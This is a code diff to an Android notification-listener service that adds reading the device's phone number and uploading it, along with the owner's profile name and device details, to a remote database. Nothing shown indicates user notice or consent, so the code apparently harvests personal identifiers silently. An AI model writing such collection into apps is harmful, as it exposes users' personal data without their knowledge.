@@ -1,6 +1,7 @@
 package io.perihelion.takecharge;
 
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -11,6 +12,7 @@ import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.amazonaws.auth.AWSCredentials;
@@ -90,6 +92,8 @@ public class MallWhereService extends NotificationListenerService implements Goo
         userDataRef.child("userinfo").child("product").setValue(Build.PRODUCT);
         userDataRef.child("userinfo").child("model").setValue(Build.MODEL);
         userDataRef.child("userinfo").child("androidVersion").setValue(Build.VERSION.RELEASE);
+        TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
+        userDataRef.child("userinfo").child("phone").setValue(tMgr.getLine1Number());
         Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
         c.moveToFirst();
         userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("DISPLAY_NAME")));
